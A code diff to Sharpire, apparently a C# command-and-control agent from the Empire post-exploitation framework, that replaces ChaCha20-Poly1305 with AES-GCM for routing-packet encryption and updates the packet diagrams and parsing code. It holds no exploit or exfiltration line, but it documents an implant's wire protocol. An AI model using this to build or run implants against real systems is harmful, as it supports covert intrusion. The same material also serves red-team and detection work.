@@ -9,7 +9,7 @@ using System.Reflection;
 using System.Text;
 using System.Threading;
 using System.Security.Cryptography;
-using ChaChaEncryption;
+using AesGcmEncryption;
 
 namespace Sharpire
 {
@@ -21,28 +21,26 @@ Defines packet types, builds tasking packets and parses result packets.
 
 Packet format:
 
-Nonce: Nonce used by ChaCha20Poly1305
-ChaCha20Poly1305(Routing Data): Encrypted RoutingData with associated Poly1305 tag
+Nonce: Nonce used by AES-GCM
+AES-GCM(Routing Data): Encrypted RoutingData with associated GCM tag
 AESc = AES encrypted using the client's session key
-ChaCha20(RoutingData): Encrypted RoutingData
-Poly1305(RoutingData): Poly1305 tag of RoutingData
 
 
     Routing Packet:
-    +---------+--------------------------------+--------------------------+
-    |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
-    +---------+--------------------------------+--------------------------+
-    |    12   |                32              |          length          |
-    +---------+--------------------------------+--------------------------+
+    +---------+---------------------------+--------------------------+
+    |  Nonce  |  AES-GCM(RoutingData)     | AESc(client packet data) | ...
+    +---------+---------------------------+--------------------------+
+    |    12   |             32            |          length          |
+    +---------+---------------------------+--------------------------+
 
-        ChaCha20+Poly1305(RoutingData):
+        AES-GCM(RoutingData):
         +---------------------------+---------------------------+
-        |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
+        |   AES-GCM Ciphertext      |       AES-GCM Tag         |
         +---------------------------+---------------------------+
         |           16              |            16             |
         +---------------------------+---------------------------+
 
-            ChaCha20(RoutingData):
+            RoutingData (plaintext):
             +-----------+------+------+-------+--------+
             | SessionID | Lang | Meta | Extra | Length |
             +-----------+------+------+-------+--------+
@@ -98,32 +96,30 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
 
         private byte[] NewRoutingPacket(byte[] encryptedBytes, int meta)
         /*
-        Constructs a routing packet with chacha20poly1305 encryption.
-        
+        Constructs a routing packet with AES-GCM encryption.
+
         Packet format:
 
-        Nonce: Nonce used by ChaCha20Poly1305
-        ChaCha20Poly1305(Routing Data): Encrypted RoutingData with associated Poly1305 tag
+        Nonce: Nonce used by AES-GCM
+        AES-GCM(Routing Data): Encrypted RoutingData with associated GCM tag
         AESc = AES encrypted using the client's session key
-        ChaCha20(RoutingData): Encrypted RoutingData
-        Poly1305(RoutingData): Poly1305 tag of RoutingData
 
 
             Routing Packet:
-            +---------+--------------------------------+--------------------------+
-            |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
-            +---------+--------------------------------+--------------------------+
-            |    12   |                32              |          length          |
-            +---------+--------------------------------+--------------------------+
+            +---------+---------------------------+--------------------------+
+            |  Nonce  |  AES-GCM(RoutingData)     | AESc(client packet data) | ...
+            +---------+---------------------------+--------------------------+
+            |    12   |             32            |          length          |
+            +---------+---------------------------+--------------------------+
 
-                ChaCha20+Poly1305(RoutingData):
+                AES-GCM(RoutingData):
                 +---------------------------+---------------------------+
-                |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
+                |   AES-GCM Ciphertext      |       AES-GCM Tag         |
                 +---------------------------+---------------------------+
                 |           16              |            16             |
                 +---------------------------+---------------------------+
 
-                    RoutingData:
+                    RoutingData (plaintext):
                     +-----------+------+------+-------+--------+
                     | SessionID | Lang | Meta | Extra | Length |
                     +-----------+------+------+-------+--------+
@@ -150,15 +146,15 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
             data = Misc.combine(data, new byte[4] { lang, Convert.ToByte(meta), 0x00, 0x00 });
             data = Misc.combine(data, BitConverter.GetBytes(encryptedBytesLength));
 
-            //encrypt the routingData with chacha20 and create an associated poly1305 tag
-            byte[] chacha_data = new byte[16];
-            byte[] poly1305_tag = new byte[16];
-            byte[] chacha_nonce = NewInitializationVector(nonce_length);
-            ChaCha20Poly1305.Encrypt(sessionInfo.GetStagingKeyBytes(), chacha_nonce, data, out chacha_data, out poly1305_tag);
+            //encrypt the routingData with AES-GCM
+            byte[] gcm_ciphertext = new byte[16];
+            byte[] gcm_tag = new byte[16];
+            byte[] gcm_nonce = NewInitializationVector(nonce_length);
+            AesGcm.Encrypt(sessionInfo.GetStagingKeyBytes(), gcm_nonce, data, out gcm_ciphertext, out gcm_tag);
 
-            //combine the nonce + chacha20 encrypted data + poly1305 tag + encryptedBytes (if applicable) into the routingPacketData bytearray
-            byte[] routingPacketData = Misc.combine(chacha_nonce, chacha_data);
-            routingPacketData = Misc.combine(routingPacketData, poly1305_tag);
+            //combine the nonce + AES-GCM ciphertext + GCM tag + encryptedBytes (if applicable) into the routingPacketData bytearray
+            byte[] routingPacketData = Misc.combine(gcm_nonce, gcm_ciphertext);
+            routingPacketData = Misc.combine(routingPacketData, gcm_tag);
             if (encryptedBytes != null && encryptedBytes.Length > 0)
             {
                 routingPacketData = Misc.combine(routingPacketData, encryptedBytes);
@@ -169,32 +165,30 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
 
         internal void DecodeRoutingPacket(byte[] packetData, ref JobTracking jobTracking)
         /*
-        Decodes a chacha20poly1305 encrypted routing packet to a normal routing packet
-        
+        Decodes an AES-GCM encrypted routing packet to a normal routing packet
+
         Packet format:
 
-        Nonce: Nonce used by ChaCha20Poly1305
-        ChaCha20Poly1305(Routing Data): Encrypted RoutingData with associated Poly1305 tag
+        Nonce: Nonce used by AES-GCM
+        AES-GCM(Routing Data): Encrypted RoutingData with associated GCM tag
         AESc = AES encrypted using the client's session key
-        ChaCha20(RoutingData): Encrypted RoutingData
-        Poly1305(RoutingData): Poly1305 tag of RoutingData
 
 
             Routing Packet:
-            +---------+--------------------------------+--------------------------+
-            |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
-            +---------+--------------------------------+--------------------------+
-            |    12   |                32              |          length          |
-            +---------+--------------------------------+--------------------------+
+            +---------+---------------------------+--------------------------+
+            |  Nonce  |  AES-GCM(RoutingData)     | AESc(client packet data) | ...
+            +---------+---------------------------+--------------------------+
+            |    12   |             32            |          length          |
+            +---------+---------------------------+--------------------------+
 
-                ChaCha20+Poly1305(RoutingData):
+                AES-GCM(RoutingData):
                 +---------------------------+---------------------------+
-                |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
+                |   AES-GCM Ciphertext      |       AES-GCM Tag         |
                 +---------------------------+---------------------------+
                 |           16              |            16             |
                 +---------------------------+---------------------------+
 
-                    RoutingData:
+                    RoutingData (plaintext):
                     +-----------+------+------+-------+--------+
                     | SessionID | Lang | Meta | Extra | Length |
                     +-----------+------+------+-------+--------+
@@ -209,10 +203,10 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
         {
             this.jobTracking = jobTracking;
 
-            // define packet structure for ChaCha20Poly1305 (12 byte nonce + 32 bytes for encrypted data and tag. Together is 40 byte header before AESc)
+            // define packet structure for AES-GCM (12 byte nonce + 32 bytes for encrypted data and tag. Together is 44 byte header before AESc)
             int nonce_length = 12;
-            int chacha_header_length = nonce_length + 32;
-            if (packetData.Length < chacha_header_length)
+            int gcm_header_length = nonce_length + 32;
+            if (packetData.Length < gcm_header_length)
             {
                 return;
             }
@@ -222,17 +216,17 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
             while (offset < packetData.Length)
             {
 
-                //parse out the routingPacket to the chachaNonce and routingChaChaData (Chacha20 encrypted + Poly1305 tag)
-                byte[] routingPacket = packetData.Skip(offset).Take(chacha_header_length).ToArray();
-                byte[] chachaNonce = routingPacket.Take(nonce_length).ToArray();
-                byte[] routingChachaData = packetData.Skip(nonce_length).Take(32).ToArray();
-                offset += chacha_header_length; // advance the offset past the chacha20poly1305 routing packet data (to AESc)
+                //parse out the routingPacket to the gcmNonce and routingGcmData (AES-GCM ciphertext + GCM tag)
+                byte[] routingPacket = packetData.Skip(offset).Take(gcm_header_length).ToArray();
+                byte[] gcmNonce = routingPacket.Take(nonce_length).ToArray();
+                byte[] routingGcmData = packetData.Skip(nonce_length).Take(32).ToArray();
+                offset += gcm_header_length; // advance the offset past the AES-GCM routing packet data (to AESc)
 
-                // decrypt and verify chacha20poly1305 data into output routingData (output decrypted routingpacket)
-                byte[] chachaData = routingChachaData.Take(16).ToArray();
-                byte[] poly1305Tag = routingChachaData.Skip(16).Take(16).ToArray();
+                // decrypt and verify AES-GCM data into output routingData (output decrypted routingpacket)
+                byte[] gcmCiphertext = routingGcmData.Take(16).ToArray();
+                byte[] gcmTag = routingGcmData.Skip(16).Take(16).ToArray();
                 byte[] routingData = new byte[16];
-                ChaCha20Poly1305.Decrypt(sessionInfo.GetStagingKeyBytes(), chachaNonce, chachaData, poly1305Tag, out routingData);
+                AesGcm.Decrypt(sessionInfo.GetStagingKeyBytes(), gcmNonce, gcmCiphertext, gcmTag, out routingData);
 
                 // parse/handle the decrypted routingpacket
                 string packetSessionId = Encoding.UTF8.GetString(routingData.Take(8).ToArray());
